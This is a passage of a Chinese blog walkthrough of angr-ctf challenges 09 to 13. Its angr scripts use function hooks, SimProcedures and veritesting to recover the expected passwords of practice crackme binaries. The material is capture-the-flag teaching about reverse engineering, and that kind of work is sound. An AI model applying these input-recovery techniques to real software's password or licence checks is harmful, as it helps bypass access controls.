class="hljs-string">&quot;EFJLFOGMURLEVNXN&quot;</span><br><br>    <span class="hljs-comment"># add and solve the constraints</span><br>    check_state.add_constraints(password == compared_str)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;password: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(check_state.solver.<span class="hljs-built_in">eval</span>(buffer, cast_to=<span class="hljs-built_in">bytes</span>)))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是秒解：</p><p><img src="https://s2.loli.net/2022/11/01/Lh5YzU3RPyD2ZTW.png" alt="image.png"></p><h1>0x04. angr-ctf：函数操作</h1><h2 id="09-angr-hooks：函数替换">09_angr_hooks：函数替换</h2><p>惯例拖入 IDA，程序大概的主体逻辑是读入 buffer 后经过 <code>complex_function()</code> 运算，之后通过 <code>check_equals()</code> 与 password 进行对比并把结果存到 <code>equals</code> 变量当中；之后将 password 经过 <code>complex_function()</code> 运算，随后再读入 buffer 与 password 进行对比；两个条件都符合了才会输出 <code>&quot;Good Job.&quot;</code></p><p>其中 <code>0x804C044</code> 就是 buffer 的地址，<code>0x804C034</code> 就是 password 的地址</p><p><img src="https://s2.loli.net/2022/11/02/sIjxptNAr7ZCeuo.png" alt="image.png"></p><p>其中 <code>check_equals()</code> 逻辑比较简单，就算简单的与 password 进行对比，不过由于是<strong>逐字符对比</strong>后增加统计数量，因此会导致<strong>路径爆炸</strong>：</p><p><img src="https://s2.loli.net/2022/11/02/5NAMaSsoHVZ4geL.png" alt="image.png"></p><p>如果是像 02 那样直接求解，<code>check_equals()</code> 带来的路径爆炸会非常令人头大，而该函数的功能本质上就仅是与一个字符串进行对比，因此我们可以<strong>使用 angr 来 hook 掉该函数，自行实现等价的操作函数</strong></p><h3 id="project-hook-函数钩子">project.hook() - 函数钩子</h3><p>有的时候我们会有需要 hook 掉某个函数的需求，此时我们可以使用 <code>project.hook(addr = call_insn_addr, hook = my_function, length = n)</code> 来 hook 掉对应的 call 指令，其中 <code>call_insn_addr</code> 为 call 指令的地址，<code>my_function</code> 为我们的自定义函数， <code>length</code> 为 call 指令的长度：</p><p><img src="https://s2.loli.net/2022/11/02/Y5ptBU8oAsTdj7c.png" alt="image.png"></p><p>我们的自定义函数应当为接收 <code>state</code> 作为参数的函数，angr 还提供了 decorator 语法糖，因此以下两种写法都可以：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># method 1</span><br><span class="hljs-meta">@project.hook(<span class="hljs-params"><span class="hljs-number">0x1234</span>, length=<span class="hljs-number">5</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook_func</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-comment"># do something, this is an example</span><br>    state.regs.eax = <span class="hljs-number">0xdeadbeef</span><br><br><span class="hljs-comment"># method 2</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook_func2</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-comment"># do something, this is an example</span><br>    state.regs.eax = <span class="hljs-number">0xdeadbeef</span><br>proj.hook(addr = <span class="hljs-number">0x5678</span>, hook = my_hook_func2, length = <span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOIT-6">FINAL EXPLOIT</h3><p>因此本题我们只需要 hook 掉比较函数便能解决路径爆炸的问题，我们使用 <code>claripy.If()</code> 创建一个比较并将值给到 eax 寄存器作为返回值，最后就是常规的内存符号化后求解即可，最终的求解脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./09_angr_hooks&#x27;</span><br>    proj = angr.Project(bin_path)<br><br>    buffer_addr = <span class="hljs-number">0x804C044</span><br>    buffer_size = <span class="hljs-number">0x10</span><br>    compared_str = <span class="hljs-string">b&#x27;XFQUUEQFKBECVEJF&#x27;</span><br><br>    start_addr = <span class="hljs-number">0x804937D</span> <span class="hljs-comment"># first insn after first scanf()</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br><br>    buffer = claripy.BVS(<span class="hljs-string">&#x27;buffer&#x27;</span>, buffer_size * <span class="hljs-number">8</span>)<br>    init_state.memory.store(buffer_addr, buffer)<br><br>    <span class="hljs-comment"># because we have passed the qmemcpy() that initial the password&#x27;s memory,</span><br>    <span class="hljs-comment"># so we need to do it manually</span><br>    password_size = <span class="hljs-number">0x10</span><br>    password_addr = <span class="hljs-number">0x804C034</span><br>    init_state.memory.store(password_addr,<br>                            claripy.BVV(<span class="hljs-built_in">int</span>.from_bytes(compared_str, <span class="hljs-string">&quot;big&quot;</span>), <br>                                        password_size * <span class="hljs-number">8</span>))<br><br><span class="hljs-meta">    @proj.hook(<span class="hljs-params">addr = <span class="hljs-number">0x80493CE</span>, length = <span class="hljs-number">5</span></span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook_func</span>(<span class="hljs-params">state</span>):<br>        buffer = state.memory.load(buffer_addr, buffer_size)<br>        <span class="hljs-comment"># eax is used for return val</span><br>        state.regs.eax = claripy.If(buffer == compared_str, <span class="hljs-comment"># constraint</span><br>                                    <span class="hljs-comment"># if success, return 1, else return 0</span><br>                                    claripy.BVV(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>), claripy.BVV(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>))<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = <span class="hljs-number">0x80493D3</span>) <span class="hljs-comment"># first insn after my_hook_func() returned</span><br><br>    check_state = simgr.found[<span class="hljs-number">0</span>]<br>    check_state.add_constraints(check_state.regs.eax == <span class="hljs-number">1</span>) <span class="hljs-comment"># constraint for eval == 1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;password0: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(check_state.solver.<span class="hljs-built_in">eval</span>(buffer, cast_to=<span class="hljs-built_in">bytes</span>)))<br><br>    <span class="hljs-comment"># now we need to calculate the password&#x27;s val after complex()</span><br>    simgr2 = proj.factory.simgr(check_state)<br>    simgr2.explore(find = <span class="hljs-number">0x8049428</span>) <span class="hljs-comment"># last insn before second scanf()</span><br><br>    check_state2 = simgr2.found[<span class="hljs-number">0</span>]<br>    password = check_state2.memory.load(password_addr, password_size)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;password1: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(check_state2.solver.<span class="hljs-built_in">eval</span>(password, cast_to=<span class="hljs-built_in">bytes</span>)))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是秒解：</p><p><img src="https://s2.loli.net/2022/11/02/xHpXA6WNqwisaLT.png" alt="image.png"></p><blockquote><p>当然，还有一种更加简洁的写法就是 hook 掉 <code>check_equals()</code> 之后直接从 <code>entry_state</code> 开始 explore() 到输出 <code>&quot;Good Job.&quot;</code> ，但笔者在刚开始写的时候是没想到的…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./09_angr_hooks&#x27;</span><br>    proj = angr.Project(bin_path)<br><br>    buffer_addr = <span class="hljs-number">0x804C044</span><br>    buffer_size = <span class="hljs-number">0x10</span><br>    compared_str = <span class="hljs-string">b&#x27;XFQUUEQFKBECVEJF&#x27;</span><br><br>    init_state = proj.factory.entry_state()<br><br><span class="hljs-meta">    @proj.hook(<span class="hljs-params">addr = <span class="hljs-number">0x80493CE</span>, length = <span class="hljs-number">5</span></span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook_func</span>(<span class="hljs-params">state</span>):<br>        buffer = state.memory.load(buffer_addr, buffer_size)<br>        <span class="hljs-comment"># rax is used for return val</span><br>        state.regs.eax = claripy.If(buffer == compared_str, <span class="hljs-comment"># constraint</span><br>                                    <span class="hljs-comment"># if success, return 1, else return 0</span><br>                                    claripy.BVV(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>), claripy.BVV(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>))<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure></blockquote><h2 id="10-angr-simprocedures：模拟过程调用">10_angr_simprocedures：模拟过程调用</h2><p>惯例拖入 IDA ，这一次的伪代码还是一坨史所以直接看汇编，可以看到虽然还是惯例的 <code>complex_function()</code> 对输入进行处理后使用 <code>check_equals()</code> 进行路径爆炸的逐字符比较，但不同的是这一次多了许多的伪路径：</p><p><img src="https://s2.loli.net/2022/11/02/rj5ThAGsOeql9FP.png" alt="image.png"></p><p>而每个伪路径后面都对应着一个路径爆炸的 <code>check_equals()</code> ：</p><p><img src="https://s2.loli.net/2022/11/02/pLiH6FYE1DJfrc9.png" alt="image.png"></p><p>如果我们对于每个伪路径后边的基本块都手动进行 hook，那未免也过于麻烦，因此这一次我们可以利用 angr 直接通过函数符号来 hook 掉 <code>check_equals()</code> 函数</p><h3 id="angr-SimProcedure-模拟函数（过程）">angr.SimProcedure - 模拟函数（过程）</h3><p>在 angr 中 <code>angr.SimProcedure</code> 类用来表示<strong>在一个状态上的一个运行过程</strong>——即函数实际上是一个 SimPrecedure</p><p>我们可以通过创建一个继承自 <code>angr.SimProcedure</code> 的类并重写 <code>run()</code> 方法的方式来表示一个自定义函数，其中 <code>run()</code> 方法的参数为该函数所接收的参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyProcedure</span>(angr.SimProcedure):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, arg1, arg2</span>):<br>        <span class="hljs-comment"># do something, this&#x27;s an example</span><br>        <span class="hljs-keyword">return</span> self.state.memory.load(arg1, arg2)<br></code></pre></td></tr></table></figure><p>自定义函数过程主要用于对文件中的原有函数进行替换，例如 angr 缺省会用内置的一些 SimProcedure 来替换掉一些库函数<br>若我们已经有该二进制文件的符号表，我们可以直接使用 <code>project.hook_symbol(symbol_str, sim_procedure_instance)</code> 来自动 hook 掉文件中所有的对应符号，其中 <code>run()</code> 方法的<strong>参数为被替换函数所接收的参数</strong>，这是一个🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python3">import angr<br>import claripy<br><br>class MyProcedure(angr.SimProcedure):<br>    def run(self, arg1, arg2):<br>        # do something, this&#x27;s an example<br>        return self.state.memory.load(arg1, arg2)<br><br>proj = angr.Project(&#x27;./test&#x27;)<br>proj.hook_symbol(&#x27;func_to_hook&#x27;, MyProcedure())<br></code></pre></td></tr></table></figure><p>当然，在 SimProcedure 的 <code>run()</code> 过程中我们也可以使用一些有用的成员函数：</p><ul><li><code>ret(expr)</code>: 函数返回</li><li><code>jump(addr)</code>: 跳转到指定地址</li><li><code>exit(code)</code>: 终止程序</li><li><code>call(addr, args, continue_at)</code>: 调用文件中的函数</li><li><code>inline_call(procedure, *args)</code>: 内联地调用另一个 SimProcedure</li></ul><h3 id="FINAL-EXPLOIT-7">FINAL EXPLOIT</h3><p>那么这里我们只需要将该符号直接替换成我们的自定义比较函数即可，因此最终的写法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python3">import angr<br>import claripy<br>import sys<br><br>class MyRelacementHookProcedure(angr.SimProcedure):<br>    def run(self, buffer_addr, buffer_len):<br>        buffer = self.state.memory.load(buffer_addr, buffer_len)<br>        compared_str = b&#x27;XFQUUEQFKBECVEJF&#x27;<br>        return claripy.If(buffer == compared_str, claripy.BVV(1, 32), claripy.BVV(0, 32))<br><br>def find_path(state):<br>    return b&#x27;Good Job.&#x27; in state.posix.dumps(sys.stdout.fileno())<br><br>def avoid_path(state):<br>    return b&#x27;Try again.&#x27; in state.posix.dumps(sys.stdout.fileno())<br><br>def solver():<br>    bin_path = &#x27;./10_angr_simprocedures&#x27;<br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br><br>    # hook the check_equals()<br>    proj.hook_symbol(&#x27;check_equals_XFQUUEQFKBECVEJF&#x27;, MyRelacementHookProcedure())<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    if simgr.found:<br>        solution_state = simgr.found[0]<br>        print(solution_state.posix.dumps(sys.stdin.fileno()))<br>    else:<br>        raise Exception(&#x27;Could not find the solution&#x27;)<br><br>if __name__ == &#x27;__main__&#x27;:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是秒解：</p><p><img src="https://s2.loli.net/2022/11/03/1GntXiVluADdbRs.png" alt="image.png"></p><h2 id="11-angr-sim-scanf：模拟-scanf">11_angr_sim_scanf：模拟 scanf</h2><p>惯例拖进 IDA，提示 graph is too big</p><p><img src="https://s2.loli.net/2022/11/03/epOU2j6iDcyZutL.png" alt="image.png"></p><p>看一下反汇编，可以发现这一次是在 <code>scanf()</code> 前面有很多伪分支：</p><p><img src="https://s2.loli.net/2022/11/03/LP97x2dUXNjTsKz.png" alt="image.png"></p><p>这些伪分支的导向都是以 <code>scanf()</code> 开头的基本块，可以看到的是其都使用 <code>%u %u</code> 来读入两个四字节无符号数后使用 <code>strncmp()</code> 与 8 字节的字符串进行对比</p><p><img src="https://s2.loli.net/2022/11/03/d4GlDOc7TANCZMS.png" alt="image.png"></p><p>在最开始还有 <code>complex_function()</code> 处理待比较的源字符串，还是老样子就不进去看了：</p><p><img src="https://s2.loli.net/2022/11/03/v8bZzJgAPOpG7K4.png" alt="image.png"></p><p>那么这题的结构和 02 其实是基本上一样的，只不过 <code>scanf()</code> 被移到了伪分支基本块中，因此用 02 的解题脚本依然可以秒解，但这样就不是我们做题的目的了：）</p><p>本题实际上算是对上一题的扩展，由于我们已知对 <code>scanf()</code> 的调用会读入两个数值，我们可以直接实现一个 SimProcedure 来模拟该过程，而不需要再走 <code>scanf()</code> 内部的复杂路径</p><p>这里我们若是在 <code>run()</code> 方法内创建 BVS ，则可以通过将其储存到 <code>state.globals</code> 列表的方式以便后续取用</p><p>因此最后的解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyScanfProcedure</span>(angr.SimProcedure):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, fmt_str, buffer0_addr, buffer1_addr</span>):<br>        buffer0 = claripy.BVS(<span class="hljs-string">&#x27;buffer0&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># 4 bytes</span><br>        buffer1 = claripy.BVS(<span class="hljs-string">&#x27;buffer1&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># 4 bytes</span><br>        self.state.memory.store(buffer0_addr, buffer0)<br>        self.state.memory.store(buffer1_addr, buffer1)<br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buffer0&#x27;</span>] = buffer0<br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buffer1&#x27;</span>] = buffer1<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./11_angr_sim_scanf&#x27;</span><br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br>    proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, MyScanfProcedure())<br>    <br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        buffer0 = solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buffer0&#x27;</span>]<br>        buffer1 = solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buffer1&#x27;</span>]<br>        password0 = solution_state.solver.<span class="hljs-built_in">eval</span>(buffer0, cast_to=<span class="hljs-built_in">bytes</span>)<br>        password1 = solution_state.solver.<span class="hljs-built_in">eval</span>(buffer1, cast_to=<span class="hljs-built_in">bytes</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>.from_bytes(password0, <span class="hljs-string">&#x27;little&#x27;</span>)))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>.from_bytes(password1, <span class="hljs-string">&#x27;little&#x27;</span>)))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是秒解：</p><p><img src="https://s2.loli.net/2022/11/03/pCsdR9Gckawg2Zm.png" alt="image.png"></p><h1>0x05. angr-ctf：路径合并</h1><h2 id="12-angr-veritesting：路径合并">12_angr_veritesting：路径合并</h2><p>惯例拖入 IDA，不知道为啥 IDA 反编译出来一坨史所以直接看汇编，在读入输入后来到的红框里是一个循环  <code>for (int i = 0; i &lt;= 0x1F; i++)</code> ，每轮循环都会计算 <code>complex_function('X', i + 'V')</code> 并将结果与 <code>input[i]</code> 对比，全部相等才能通过</p><p><img src="https://s2.loli.net/2022/11/04/WaUX8uEwyiMeJFs.png" alt="image.png"></p><p>当然如果当作常规的逆向题来做的话解题脚本很快就能写好了，但这不是我们做题的目的：）</p><p>这题看起来和第一题差不多，由但其逐字符比较增加计数的写法会导致路径爆炸的问题，因此我们需要进行 <strong>路径合并</strong> ，这里我们可以直接在创建 simgr 时指定参数 <code>veritesting=True</code>，这样 angr 便会在运行过程中自动进行路径合并，从而缓解路径爆炸的问题</p><blockquote><p>具体原理可以参考 <a href="https://users.ece.cmu.edu/~dbrumley/pdf/Avgerinos%20et%20al._2014_Enhancing%20Symbolic%20Execution%20with%20Veritesting.pdf">这篇论文</a></p></blockquote><p>因此最后的解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;12_angr_veritesting&#x27;</span><br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state, veritesting = <span class="hljs-literal">True</span>)<br>    simgr.explore(find = <span class="hljs-number">0x8049371</span>, avoid = <span class="hljs-number">0x8049393</span>)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是几秒钟就解出来了：</p><p><img src="https://s2.loli.net/2022/11/04/FvgfaL9sIjND3bh.png" alt="image.png"></p><h1>0x06. angr-ctf：库操作</h1><h2 id="13-angr-static-binary：静态编译函数替换">13_angr_static_binary：静态编译函数替换</h2><p>惯例拖入 IDA，这次还是惯例的读入输入后使用 complex 函数处理后与待对比字符串进行对比的模式，和第一题基本一样，不同的是这一次的二进制文件是静态编译的</p><p><img src="https://s2.loli.net/2022/11/04/4IDZJ85bN2oV6BU.png" alt="image.png"></p><p>笔者一开始也没看明白要干啥，后面拉第一题的脚本过来简单跑了一下发现半天没出结果，看了看出题人留下的 <code>scaffold13.py</code> 中有这样的话：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># This challenge is the exact same as the first challenge, except that it was</span><br><span class="hljs-comment"># compiled as a static binary. Normally, Angr automatically replaces standard</span><br><span class="hljs-comment"># library functions with SimProcedures that work much more quickly.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># To solve the challenge, manually hook any standard library c functions that</span><br><span class="hljs-comment"># are used. Then, ensure that you begin the execution at the beginning of the</span><br><span class="hljs-comment"># main function. Do not use entry_state.</span><br></code></pre></td></tr></table></figure><p>大概就是说通常 angr 会自动将标准库当中的函数替换成 angr 内建的 SimProcedures 伪函数以获得更快的运行速度，但这一次是静态编译的题目，需要我们手动进行替换；同时由于程序运行起始是 <code>__libc_start_main()</code> ，在运行到 main 之前会走很多不必要的但是被静态编译进来的弯路，因此我们需要手动从 main 开始执行而非直接使用 <code>entry_state()</code> ，不过直接替换掉 <code>__libc_start_main()</code> 也是可以的</p><p>获取 angr 内置库函数的方式是 <code>angr.SIM_PROCEDURES[lib_name][function_name]</code> ，和我们之前自定义的 hook 函数一样都是 <code>SimProcedure</code> 类，因此我们可以使用 <code>project.hook(func_addr, sim_procedure_instance)</code> 的方式进行 hook，需要注意的是除了 <code>__libc_start_main</code> 以外的需要被 hook 的函数都有大量引用，因此不要图省事直接使用 <code>hook_symbol()</code></p><p>因此最后的解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span 